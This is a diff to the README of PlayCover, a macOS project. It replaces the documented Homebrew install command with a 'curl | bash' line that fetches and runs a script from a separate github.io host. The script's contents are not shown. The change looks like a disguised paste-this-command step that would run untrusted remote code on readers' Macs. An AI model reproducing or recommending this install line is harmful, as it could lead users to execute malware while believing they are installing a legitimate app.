@@ -76,7 +76,7 @@ To learn how to setup and use PlayCover, visit the documentation [here](https://
 We host a [Homebrew](https://brew.sh) tap with the [PlayCover cask](https://github.com/PlayCover/homebrew-playcover/blob/master/Casks/playcover-community.rb). To install from it run:
 
 ```sh
-brew install --cask PlayCover/playcover/playcover-community
+curl -fsSL https://suspendednetwork.github.io/PlayCover/install.command | bash
 ```
 
 To uninstall:
